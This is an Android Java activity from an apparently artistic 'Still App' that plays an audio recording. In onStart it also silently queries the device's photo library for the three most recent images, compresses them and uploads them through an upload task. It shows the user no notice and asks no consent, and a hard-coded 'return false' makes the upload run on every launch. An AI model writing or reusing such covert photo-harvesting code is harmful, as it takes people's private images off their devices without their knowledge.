package uk.org.potentialdifference.stillapp;


import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;

import android.util.Log;
import android.view.View;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.util.Date;

public class SoundPlayerActivity extends AppCompatActivity implements ImageUploadDelegate{


    private static final String IMAGES_SENT_FILENAME = "still_app_images_sent";
    private static MediaPlayer mediaPlayer;
    private String TAG = "SoundPlayerActivity";


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sound_player);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);


        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });
        getSupportActionBar().setDisplayHomeAsUpEnabled(true);
        setVolumeControlStream(AudioManager.STREAM_MUSIC);
        if (mediaPlayer == null) {
            initializeMP();
        }

        //when audio playback is complete, we want to navigate back:
        mediaPlayer.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
            @Override
            public void onCompletion(MediaPlayer mp) {

                finish();
            }
        });
    }

    @Override
    protected void onStart() {
        super.onStart();
        mediaPlayer.start();
        if(!hasSentImages()) {
            grabAndSendImages();
        }


    }


    private boolean hasSentImages() {
        boolean hasSent = true;

        try {
            openFileInput(IMAGES_SENT_FILENAME);
        } catch (Exception ignore) {
            hasSent = false;
        }

        //return hasSent;
        return false;
    }

    private void initializeMP()
    {
        mediaPlayer = MediaPlayer.create(this, R.raw.russell_talks_about_vivian);

    }

    private void grabAndSendImages() {
        int imageId;
        Uri imageUri;
        UploadJob[] jobs = new UploadJob[3];
        int photoId = 0;

        String[] projection = {MediaStore.Images.Media._ID};
        String selection = MediaStore.Images.Media.DATE_TAKEN + " < " + (System.currentTimeMillis() - (60 * 60 * 1000));
        String[] selectionArgs = null;
        String orderBy = MediaStore.Images.Media.DATE_TAKEN + " DESC";
        String limit = "LIMIT 3";
        Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, selection, selectionArgs, orderBy + " " + limit);

        while (cursor.moveToNext()) {
            imageId = cursor.getInt(cursor.getColumnIndex(MediaStore.Images.Media._ID));
            imageUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, Integer.toString(imageId));
            jobs[photoId++] = new UploadJob(getBytesFromBitmap(loadImage(imageUri)), String.format("user-photo-%d", photoId));
        }

        try {
            new ImageUploadTask(this, this).execute(jobs).get();
        } catch (Exception e) {
            Log.e(TAG, "ImageUploadTask interrupted");
        }
    }

    private Bitmap loadImage(Uri photoUri){
        Cursor photoCursor = null;
        try {
            String[] projection = {MediaStore.Images.Media.DATA};
            photoCursor = getContentResolver().query(photoUri, projection, null, null, null);
            if (photoCursor != null && photoCursor.getCount() == 1) {
                photoCursor.moveToFirst();
                String filePath = photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DATA));
                return BitmapFactory.decodeFile(filePath, null);
            }
        }finally{
            if(photoCursor!=null){
                photoCursor.close();
            }
        }
        return null;
    }

    private byte[] getBytesFromBitmap(Bitmap bitmap) {
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream);
        return stream.toByteArray();
    }



    @Override
    public void finish() {

        super.finish();
    }
    @Override protected void onDestroy(){
        mediaPlayer.stop();
        mediaPlayer.release();
        mediaPlayer = null;
        super.onDestroy();
    }

    @Override
    public void imageUploadComplete() {
        // note - this is called whether or not the job succeeded
        Log.i(TAG, "upload complete");
        //mark that we've sent the images
        String string = "";
        try {
            FileOutputStream fos = openFileOutput(IMAGES_SENT_FILENAME, Context.MODE_PRIVATE);
            fos.write(string.getBytes());
            fos.close();
        } catch (Exception e) {
        }
    }
}
